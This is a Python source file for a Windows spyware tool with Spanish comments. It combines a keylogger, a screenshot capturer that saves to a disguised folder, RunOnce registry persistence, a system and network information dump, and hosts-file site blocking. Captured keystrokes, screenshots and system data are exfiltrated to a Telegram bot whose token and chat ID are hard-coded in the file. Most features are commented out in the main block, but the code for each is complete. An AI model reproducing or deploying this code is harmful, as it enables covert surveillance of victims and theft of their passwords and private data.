# import libs
#import ctypes, sys
#from pip._vendor import requests
import ctypes
import os

from pynput.keyboard import Listener  # Escucha eventos del teclado

import socket  # Verifica internet
import threading  # procesos multihilos
from datetime import datetime  # Devuelve fecha y hora actual
from winreg import OpenKey, SetValueEx, KEY_ALL_ACCESS, HKEY_CURRENT_USER, REG_SZ  # Modifica registros de Windows
import datetime  # Devuelve fecha y hora actual
import random  # Genera numeros
import telepot  # Telegram API
import string  # Lib genera textos
import time  # Contar segundos
#import shutil
from PIL import ImageGrab  # Toma capturas de pantalla

# region Config
class Config:
    def __init__(self):
        self.USERNAME = str(os.getlogin())
        self.DELAY = 2  # Seconds
        self.DEBUG = True  # Show data in console

    class TelegramBot:
        def __init__(self):
            self.ID = [-1001208151511]  # or [11111111111, 222222222222, -3333333333333]
            self.TOKEN = "1479089003:AAHyp-gXXezKm130WHwpMSFNOAZWJQME-Vk"

    class Keylogger:
        def __init__(self):
            self.ACTIVE = True
            self.LIMIT = 10  # Limit of letters # do not change

    class Screenshot:
        def __init__(self):
            self.ACTIVE = True
            self.PATH = r"C:\Users" + "\\" + Config().USERNAME + r"\AppData\Roaming\Microsoft\Windows\Security\Recovery\User" + "\\"
            self._NAME = "s5s6df45sdf456dsf4fds6fds"
            self.INTERVAL = 10  # seconds


# endregion

class Util:
    def create_folder(self, path):
        try:  # Intenta crear la dirección
            os.makedirs(path)
            print("[CreateFolders] Success create folder: " + path)
        except:
            print("[CreateFolders] Folder realy exist: " + path)

    def current_time(self):
        T = datetime.datetime.now()
        return T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
            "%I") + " " + T.strftime("%M") + " " + T.strftime("%p")

    def random_char(self, number=4):  # Genera letras aleatorias [Longitud según el argumento]
        return ''.join(random.choice(string.ascii_letters) for x in range(number))

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def split_string(self, n, st):
        lst = ['']
        for i in str(st):
            l = len(lst) - 1
            if len(lst[l]) < n:
                lst[l] += i
            else:
                lst += [i]
        return lst


class Screenshot:
    def _delete(self, name):
        try:
            os.remove(Config().Screenshot().PATH + name)
            print("[ScreenShot] Delete Sucess") if Config().DEBUG else False
        except:
            print("[ScreenShot] There was a mistake while erasing file") if Config().DEBUG else False

    def send(self):
        Util().create_folder(Config().Screenshot().PATH)
        while True:
            try:
                name = Config().USERNAME + " " + Util().current_time() + " " + Util.random_char(4) + ".png"
                print("[Screenshot] File name: " + name) if Config().DEBUG else False

                ImageGrab.grab().save(Config().Screenshot().PATH + name)
                print("[ScreenShot] Take and save screenshot") if Config().DEBUG else False
                bot = telepot.Bot(Config.TelegramBot().TOKEN)
                for id in Config().TelegramBot().ID:
                    try:
                        bot.sendChatAction(id, 'upload_photo')
                        bot.sendPhoto(id, open(Config().Screenshot().PATH + name, 'rb'))
                        # bot.sendDocument(id, open(Config().Screenshot().PATH + name, 'rb'))
                        print("[SEND ScreenShot] Send keylogger to: [ID] " + str(id)) if Config().DEBUG else False
                    except:
                        print("[SEND ScreenShot] there was a mistake when sending the [ID] " + str(
                            id)) if Config().DEBUG else False
                self._delete(name)
                time.sleep(Config.Screenshot().INTERVAL)
            except:
                pass


class StartUp:
    def infinite(self):
        print("[StartUp] Init")
        while True:
            print("[StartUp] while...")
            try:
                registry = OpenKey(HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\RunOnce', 0,
                                   KEY_ALL_ACCESS)  # local
                SetValueEx(registry, "runSoftware", 0, REG_SZ, __file__)  # Config().StarUp().PATH_PROGRAM
                registry.Close()
                print("[StartUp] USER - EXITOSO")
            except:
                print("[StartUp] USER - Error")
            time.sleep(65)


class Key:
    def __init__(self):
        self.buffer = ""

    def _send(self, reg_text):
        bot = telepot.Bot(Config().TelegramBot().TOKEN)
        for id in Config().TelegramBot().ID:
            try:
                bot.sendMessage(id, reg_text)
                print("[SEND TelegramBot] Send keylogger to: [ID] = " + str(id)) if Config().DEBUG else False
            except:
                print("[SEND TelegramBot] there was a mistake when sending the [ID] = " + str(
                    id)) if Config().DEBUG else False

    def listen_key(self):
        def _key_min(numberKey):  # Caracteres Comunes // Optimizados
            switcher = {
                # Vocales Minisculas
                "'a'": "a",
                "'e'": "e",
                "'i'": "i",
                "'o'": "o",
                "'u'": "u",
                # Letras  Minusculas
                "'b'": "b",
                "'c'": "c",
                "'d'": "d",
                "'f'": "f",
                "'g'": "g",
                "'h'": "h",
                "'j'": "j",
                "'J'": "J",
                "'k'": "k",
                "'l'": "l",
                "'m'": "m",
                "'n'": "n",
                "'ñ'": "ñ",
                "'p'": "p",
                "'q'": "q",
                "'r'": "r",
                "'s'": "s",
                "'t'": "t",
                "'v'": "v",
                "'w'": "w",
                "'x'": "x",
                "'y'": "y",
                "'z'": "z",
                # Caracteres
                "','": ",",  # ,
                "'.'": ".",  # .
                "'_'": "_",  # _
                "'-'": "-",  # -
                "':'": ":",  #
                # Vocales Mayúsculas
                "'A'": "A",
                "'E'": "E",
                "'I'": "I",
                "'O'": "O",
                "'U'": "U",
                # Letras Mayúsculas
                "'B'": "B",
                "'C'": "C",
                "'D'": "D",
                "'F'": "F",
                "'G'": "G",
                "'H'": "H",
                "'K'": "K",
                "'L'": "L",
                "'M'": "M",
                "'N'": "N",
                "'Ñ'": "Ñ",
                "'P'": "P",
                "'Q'": "Q",
                "'R'": "R",
                "'S'": "S",
                "'T'": "T",
                "'V'": "V",
                "'W'": "W",
                "'X'": "X",
                "'Y'": "Y",
                "'Z'": "Z",
                # Números Standard
                "'1'": "1",
                "'2'": "2",
                "'3'": "3",
                "'4'": "4",
                "'5'": "5",
                "'6'": "6",
                "'7'": "7",
                "'8'": "8",
                "'9'": "9",
                "'0'": "0",
                # Caracteres Especiales
                "'@'": "@",  # @
                "'#'": "#",  # #
                "'*'": "*",  # *
                "'('": "(",  # (
                "')'": ")",  # )
                '"\'"': "'",  # '
                "'\"'": '"',  # "
                "'?'": "?",  # ?
                "'='": "=",  # =
                "'+'": "+",  # +
                "'!'": "!",  # !
                "'}'": "}",  # }
                "'{'": "{",  # {}
                "'´'": "´",  # ´
                "'|'": "|",  # |
                "'°'": "°",  # °
                "'^'": "¬",  # ^
                "';'": ";",  #
                "'$'": "$",  # $
                "'%'": "%",  # %
                "'&'": "&",  # &
                "'>'": ">",  #
                "'<'": "<",  #
                "'/'": "/",  # /
                "'¿'": "¿",  # ¿
                "'¡'": "¡",  # ¡
                "'~'": "~"  #
            }
            return switcher.get(numberKey, "")  # Convierte tecla a un valor legible

        def _key_max(numberKey):  # Botones, comunes // Optimizados
            switcher = {
                "Key.space": " ",  # Espacio
                "Key.backspace": "⋪",  # Borrar
                "Key.enter": "\n",  # Salto de linea
                "Key.tab": "    ",  # Tabulación
                "Key.delete": "❌",  # Suprimir
                # Números
                "<96>": "0",  # 0
                "<97>": "1",  # 1
                "<98>": "2",  # 2
                "<99>": "3",  # 3
                "<100>": "4",  # 4
                "<101>": "5",  # 5
                "<102>": "6",  # 6
                "<103>": "7",  # 7
                "<104>": "8",  # 8
                "<105>": "9",  # 9
                "<181>": "♪",  # Open Music ♪

                # Números Númeral
                "None<96>": "0",  # 0
                "None<97>": "1",  # 1
                "None<98>": "2",  # 2
                "None<99>": "3",  # 3
                "None<100>": "4",  # 4
                "None<101>": "5",  # 5
                "None<102>": "6",  # 6
                "None<103>": "7",  # 7
                "None<104>": "8",  # 8
                "None<105>": "9",  # 9
                # Teclas raras 2
                "['^']": "^",
                "['`']": "`",  #
                "['¨']": "¨",  #
                "['´']": "´",  #
                "<110>": ".",  #
                "None<110>": ".",  #
                "Key.alt_l": " ◀Alt ",  #
                "Key.alt_r": " Alt▶ ",
                "Key.shift_r": " Shift▶ ",
                "Key.shift": " ◀Shift ",
                "Key.ctrl_r": " Ctrl▶ ",  #
                "Key.ctrl_l": " ◀Ctrl ",  #
                "Key.right": "▶",  #
                "Key.left": "◀",  #
                "Key.up": "🔼",  #
                "Key.down": "🔽",  #
                # "'\x16'"  : " [Pegó] ",
                # "'\x18'"  : " [Cortar] ",
                # "'\x03'"  : " [Copiar] ",
                "Key.caps_lock": " 🔒⌨ ",
                "Key.num_lock": " 🔒🔢 ",
                # "Key.media_previous"    : "⏮",
                # "Key.media_next"        : "⏭",
                # "Key.media_play_pause"  : "⏹",
                # "Key.media_volume_mute" : "🔇",
                # "Key.media_volume_up" : "🔊",
                # "Key.media_volume_down" : "🔉",
                "Key.cmd": " ⊞ "
            }
            return switcher.get(numberKey, "")  # Convierte tecla a un valor legible

        # instance Obj Config
        config = Config()
        debug = config.DEBUG
        print("[KeyLogger] - Start OK") if debug else False

        def press(key):
            try:
                if (len(str(key))) <= 3:
                    temp = _key_min(str(key))  # Optimitation process and memory
                else:
                    temp = _key_max(str(key))  # Optimitation process and memory
                self.buffer = self.buffer + temp  # save keylogger in variable
                print("    " + str(key) + " <= [key press]=> " + temp) if debug else False
                print(self.buffer) if debug else False

                if len(self.buffer) >= config.Keylogger().LIMIT:
                    print("[KEYLOGGER] Reached or exceeded the limit  => " + str(len(self.buffer))) if debug else False
                    self._send(self.buffer)
                    self.buffer = ""
                else:
                    print("[KEYLOGGER] Current text length  => " + str(len(self.buffer))) if debug else False
            except:
                print("[KEYLOGGER] there was a mistake getting key ") if debug else False

        with Listener(on_press=press) as listener:
            listener.join()


class WebsiteBlock:
    def __init__(self):
        self.hostsPath = r"C:\Windows\System32\drivers\etc\hosts"
        self.pathListWeb = r"list websites.txt"
        self.hostsTextOriginal = "" \
                                 "# Copyright (c) 1993-2009 Microsoft Corp.\n" \
                                 "#\n" \
                                 "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n" \
                                 "#\n" \
                                 "# This file contains the mappings of IP addresses to host names. Each\n" \
                                 "# entry should be kept on an individual line. The IP address should\n" \
                                 "# be placed in the first column followed by the corresponding host name.\n" \
                                 "# The IP address and the host name should be separated by at least one\n" \
                                 "# space.\n" \
                                 "#\n" \
                                 "# Additionally, comments (such as these) may be inserted on individual\n" \
                                 "# lines or following the machine name denoted by a '#' symbol.\n" \
                                 "#\n" \
                                 "# For example:\n" \
                                 "#\n" \
                                 "#      102.54.94.97     rhino.acme.com          # source server\n" \
                                 "#       38.25.63.10     x.acme.com              # x client host\n" \
                                 "\n" \
                                 "# localhost name resolution is handled within DNS itself.\n" \
                                 "#	127.0.0.1       localhost\n" \
                                 "#	::1             localhost"
        self.listWebs =  "www.gogle.com\n"\
                         "www.wikipedia.com\n"\
                         "www.bing.com\n"\
                         "www.es.yahoo.com\n"\
                         "www.altavista.com\n"\
                         "www.ask.com\n"\
                         "www.gigablast.com\n"\
                         "www.excite.com\n"\
                         "www.lycos.com\n"\
                         "www.wolframalpha.com\n"\
                         "http://zanran.com/q/\n"\
                         "www.quandl.com\n"\
                         "www.factbites.com\n"\
                         "ww.nationmaster.com\n"\
                         "www.facebook.com\n"\
                         "www.Instagram.com\n"\
                         "www.twiter.com\n"\
                         "www.tiktok.com\n"\
                         "www.youtube.com\n"\
                         "www.wechat.com\n"\
                         "www.linkedln.com\n"\
                         "www.skype.com\n"\
                         "www.snapchat.com\n"\
                         "www.pinterest.com\n"\
                         "www.whatsapp.com\n"\
                         "www.reddit.com\n"
        # self.hostsPath = r"test.txt"

    def __read_file(self, path):
        content = ""
        file = open(path, "r")
        for l in file.readlines():
            content += l
        file.close()
        return content

    def __write_file(self, text, split=True, type="a"):
        file = open(self.hostsPath, type)
        try:
            for t in text.split("\n"):
                file.write("\n127.0.0.1    " + t) if split else file.write(t + "\n")
        except:
            print("Falló el split")
            # file.write(text)
        file.close()

    def __rewrite_file(self, text):
        self.__write_file(text, False, "w")
        print("Se restauró archivo Hosts File")

    def __delete_file(self, path):
        try:
            os.remove(path)
        except:
            pass

    """
    def __backup(self,path1, path2):
        try:
            self.__delete_file(path1)
            shutil.copy(path1, path2)
            print("Backup - Sucess ")
        except:
            print("Backup - there was mistake error ")
    """

    def block(self):
        print("Se bloquearon las siguientes paginas webs:")
        # webs = self.__read_file(self.pathListWeb)
        webs = self.listWebs
        print(webs)
        self.__write_file(webs)

    def unlock(self):
        self.__rewrite_file(self.hostsTextOriginal)

    def reset(self):
        self.unlock()


class PCInformation:
    def __init__(self):
        pass

    @staticmethod
    def __CMD_command(title, command):
        response = title + "\n"
        lines = os.popen(command)
        for line in lines:
            line.replace('\n\n', '\n')
            response += line
        return response

    def __display_dns(self):
        return self.__CMD_command(
            title="DNS Display Information",
            command="ipconfig /displaydns")

    def __ip_config(self):
        return self.__CMD_command(
            title="Information: IP Config /all",
            command="ipconfig /all")

    def __system_info(self):
        return self.__CMD_command(
            title="Information: System",
            command="systeminfo")

    def __driver_info(self):
        return self.__CMD_command(
            title="Information: Driver Information",
            command="DRIVERQUERY")

    def __taks_list(self):
        return self.__CMD_command(
            title="Information: Taks List",
            command="TASKLIST")
    def __service_active(self):
        return self.__CMD_command(
            title="Information: Services active",
            command="net start")

    def __red_info(self):
        def internalIP():
            internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            internal_ip.connect(('google.com', 0))
            return internal_ip.getsockname()[0]

        response = "Information: RED Info\n"
        lines = os.popen('arp -a -N ' + internalIP())
        for line in lines:
            line.replace('\n\n', '\n')
            response += line
        return response

    def send(self):
        bot = telepot.Bot(Config.TelegramBot().TOKEN)
        chat_id = Config.TelegramBot().ID[0]

        send = [self.__display_dns(),
                self.__red_info(),
                self.__ip_config(),
                self.__system_info(),
                self.__driver_info(),
                self.__taks_list(),
                self.__service_active()]
        for i in send:
            try:
                bot.sendChatAction(chat_id, 'typing')
                print(i)
                responses = Util().split_string(3900, i)
                for resp in responses:
                    time.sleep(2)
                    bot.sendMessage(chat_id, resp)
                else:
                    pass
            except:
                pass
        else:
            pass


if __name__ == '__main__':
    # Verifica permisos de admistrador: Administrador
    print("Is Admin?: Admin Sucess" if Util().is_admin() else "Is Admin?: Admin Failed")
    #threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
    threading.Thread(target=WebsiteBlock().reset()).start()  if Util().is_admin() else False  # Desbloquear Webs
    #print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
    #threading.Thread(target=StartUp().infinite).start()

    #threading.Thread(target=PCInformation().send).start()

    #threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
    #threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
    
    """
    if is_admin():
        # Code of your program here
        print("ya eres admin prro")
    else:
        # Re-run the program with admin rights
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        print("no sos admin pibe")
    """
